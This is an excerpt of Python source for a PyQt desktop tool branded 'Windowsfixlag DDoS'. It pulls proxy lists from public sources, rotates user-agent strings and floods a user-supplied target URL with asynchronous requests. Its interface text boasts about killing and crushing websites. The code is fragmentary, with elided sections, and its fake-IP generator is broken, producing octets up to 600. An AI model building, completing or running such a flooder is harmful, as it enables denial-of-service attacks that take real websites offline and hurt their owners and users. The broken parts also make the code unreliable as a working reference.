...
user_agents = [
    ...
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
...
proxy_sources = [
    ...
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt","https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    ...
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt", "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
...
class AttackThread(QThread):
    ...
    async def get_all_ips(self):
        ...
        all_ips.extend([f"{random.randint(1, 600)}.{random.randint(0, 600)}.{random.randint(0, 600)}.{random.randint(0, 600)}" for _ in range(500)])
        return all_ips
    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"Windowsfixlag@Windowsfixlag's PC -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  
    ...
    async def attack(self):
        ...
        if not ip_list:
            self.log_signal.emit("No IP list found. Shorky is generating random IPs...")
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Windowsfixlag")
        self.setGeometry(200, 200, 80, 80)
        self.setStyleSheet("QMainWindow { background-color: #E8F8FD; color: black; border-radius: 5px; }")
        ...
        self.log_output.setStyleSheet("background-color: #E8F8FD; color: #0F7595; border: 1px solid #0F7595; border-radius: 5px;")
        ...
        image_url = "https://wallpapers-clan.com/wp-content/uploads/2026/01/chibi-shinobu-resting-on-a-snowy-tree-branch-desktop-wallpaper-preview.jpg"
        
        self.load_image(image_url)

        slogan_label = QLabel("Windowsfixlag DDoS Wants To Kill Some Websites ")
        slogan_label.setAlignment(Qt.AlignCenter)
        slogan_label.setStyleSheet("color: #0F7595; font-size: 14px; font-weight: bold;")
        layout.addWidget(slogan_label)

        title_label = QLabel("YTB: Windowsfixlag")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #6AD1F0; font-size: 24px; font-weight: bold;")
        layout.addWidget(title_label)

        self.url_label = QLabel("Target URL:")
        self.url_label.setAlignment(Qt.AlignCenter)
        self.url_label.setStyleSheet("color: #59B7D4;")
        layout.addWidget(self.url_label)

        self.url_input = QLineEdit()
        self.url_input.setFixedWidth(300)
        self.url_input.setStyleSheet("background-color: #80D1ED; color: white; border: 1px solid #6AD1F0; border-radius: 5px;")
        ...
        self.requests_label.setStyleSheet("color: #59B7D4;")
        layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setFixedWidth(300)
        self.requests_input.setStyleSheet("background-color: #80D1ED; color: white; border: 1px solid #6AD1F0; border-radius: 5px;")
        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)

        self.start_button = QPushButton("Start")
        self.start_button.setFixedWidth(100)
        self.start_button.setStyleSheet("background-color: #94DEF4; color: white; border-radius: 5px;")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "Windowsfixlag", "Number of requests must be an integer!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Windowsfixlag", "Enter a valid URL and number of requests!")
            return

        self.log_message("DDoS attack started. Target will be crushed by Windowsfixlag power!")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "Windowsfixlag", "Attack has begun! Check the logs, Rawr!")
